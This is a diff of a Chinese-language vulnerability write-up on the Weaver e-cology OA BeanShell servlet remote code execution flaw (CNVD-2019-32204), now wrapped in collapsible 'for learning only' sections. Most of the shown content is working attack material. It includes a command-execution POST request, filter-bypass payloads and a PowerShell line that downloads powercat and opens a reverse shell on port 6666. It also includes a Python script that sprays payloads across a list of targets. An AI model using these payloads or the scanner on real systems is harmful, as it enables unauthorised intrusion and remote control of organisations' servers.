@@ -52,22 +52,27 @@ Content-Length: 98
 Content-Type: application/x-www-form-urlencoded
 
 bsh.script=ex\u0065c("cmd /c dir");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 **关于绕过**
 
 ```shell
 eval%00("ex"%2b"ec(\"whoami\")");
 ex\u0065c("cmd /c dir");
-IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd
-```
+IEX(&#78;ew-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd</code></pre>
+
+</details>
 
 ## 漏洞POC
 
 https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204
 
-```python
-#/usr/bin/python
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-python">#/usr/bin/python
 #coding:utf-8
 #Author:Ja0k
 #For Weaver-Ecology-OA_RCE
@@ -96,9 +101,9 @@ def Poc_check(target):
     Url_Payload3="/weaveroa/bsh.servlet.BshServlet"
     Url_Payload4="/oa/bsh.servlet.BshServlet"
     
-    Data_Payload1="""bsh.script=exec("whoami");&bsh.servlet.output=raw"""
-    Data_Payload2= """bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"""
-    Data_Payload3= """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami"""
+    Data_Payload1="""bsh.script=&#101;xec("whoami");&amp;bsh.servlet.output=raw"""
+    Data_Payload2= """bsh.script=\u0065\u0078\u0065\u0063("whoami");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw"""
+    Data_Payload3= """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&amp;command=whoami"""
     for Url_Payload in (Url_Payload1,Url_Payload2,Url_Payload3,Url_Payload4):
         url= target + Url_Payload
         for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): 
@@ -106,7 +111,7 @@ def Poc_check(target):
                 http_response = requests.post(url,data=Data_payload,headers=headers,verify=False)
                 #print http_response.status_code
                 if http_response.status_code == 200:
-                    if ";</script>" not in (http_response.content):
+                    if ";&lt;/script&gt;" not in (http_response.content):
                         if "Login.jsp" not in (http_response.content):
                             if "Error" not in (http_response.content):
                                 print "{0} is a E-cologyOA_RCE Vulnerability".format(url)
@@ -121,8 +126,9 @@ def Poc_check(target):
 if __name__ == '__main__':
     for line in open(sys.argv[1]).readlines():
         target=line.strip()
-        Poc_check(target)
-```
+        Poc_check(target)</code></pre>
+
+</details>
 
 ```plain
 #1.install python Dependencies Library 
